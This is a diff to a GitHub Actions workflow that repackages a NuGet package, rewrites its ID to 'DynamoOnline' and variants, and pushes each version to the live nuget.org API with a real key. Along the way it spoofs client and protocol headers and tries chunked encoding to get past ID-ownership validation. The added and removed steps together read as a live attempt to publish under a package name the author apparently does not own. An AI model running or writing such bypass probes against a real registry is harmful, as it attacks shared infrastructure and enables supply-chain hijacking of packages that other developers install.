@@ -34,65 +34,99 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Try different API endpoints
+      - name: Test older protocol and validation bypass
         run: |
           cd artifacts
           ORIG_PKG=$(ls *.nupkg)
           
-          # Create package with DynamoOnline ID
-          rm -rf tampered tampered.nupkg
-          mkdir tampered
+          # Test 1: Older protocol version (4.0.0)
+          echo "=== Test with protocol 4.0.0 ==="
+          rm -rf tampered && mkdir tampered
           unzip -o "$ORIG_PKG" -d tampered
           find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
-          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>2.0.0</version>|g" {} \;
-          cd tampered && zip -r ../tampered.nupkg . && cd ..
+          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>4.0.0</version>|g" {} \;
+          cd tampered && zip -r ../test1.nupkg . && cd ..
           
-          echo "=== Try v2 package endpoint ==="
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 4.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.0.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test1.nupkg
+
+          # Test 2: HTTP/1.0 style (no protocol version)
+          echo -e "\n\n=== Test without protocol version ==="
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 2.8.6" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test1.nupkg
+
+          # Test 3: Chunked encoding
+          echo -e "\n\n=== Test with chunked transfer ==="
           curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
             -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+            -H "Transfer-Encoding: chunked" \
+            --data-binary @test1.nupkg
           
-          echo -e "\n\n=== Try v3 package endpoint ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://api.nuget.org/v3/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 6.0.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+          # Test 4: Package ID with underscore at start (regex might allow this)
+          echo -e "\n\n=== Test underscore prefix ==="
+          rm -rf tampered && mkdir tampered
+          unzip -o "$ORIG_PKG" -d tampered
+          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>_DynamoOnline</id>|g" {} \;
+          cd tampered && zip -r ../test2.nupkg . && cd ..
           
-          echo -e "\n\n=== Try v3 flat container ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://api.nuget.org/v3-flatcontainer/dynamoonline/2.0.0/dynamoonline.2.0.0.nupkg" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          echo -e "\n\n=== Try symbolpackage endpoint ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/symbolpackage/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 6.0.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          echo -e "\n\n=== Try with different HTTP methods ==="
-          curl -s -w "\nHTTP:%{http_code}" -X POST "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 6.0.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          echo -e "\n\n=== Try multipart form ==="
           curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "X-NuGet-Client-Version: 6.0.0" \
-            -F "package=@tampered.nupkg"
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test2.nupkg
           
-          echo -e "\n\n=== Try package ID in URL ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/DynamoOnline/2.0.0" \
+          # Test 5: Package ID with number at start
+          echo -e "\n\n=== Test number prefix ==="
+          rm -rf tampered && mkdir tampered
+          unzip -o "$ORIG_PKG" -d tampered
+          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>1DynamoOnline</id>|g" {} \;
+          cd tampered && zip -r ../test3.nupkg . && cd ..
+          
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
             -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+            --data-binary @test3.nupkg
+          
+          # Test 6: Empty package ID (see what error we get)
+          echo -e "\n\n=== Test empty ID ==="
+          rm -rf tampered && mkdir tampered
+          unzip -o "$ORIG_PKG" -d tampered
+          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id></id>|g" {} \;
+          cd tampered && zip -r ../test4.nupkg . && cd ..
+          
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test4.nupkg
+          
+          # Test 7: Whitespace in package ID
+          echo -e "\n\n=== Test whitespace ==="
+          rm -rf tampered && mkdir tampered
+          unzip -o "$ORIG_PKG" -d tampered
+          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>Dynamo Online</id>|g" {} \;
+          cd tampered && zip -r ../test5.nupkg . && cd ..
+          
+          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
+            -H "X-NuGet-ApiKey: $NUGET_KEY" \
+            -H "X-NuGet-Client-Version: 6.0.0" \
+            -H "X-NuGet-Protocol-Version: 4.1.0" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @test5.nupkg
             
         env:
           NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
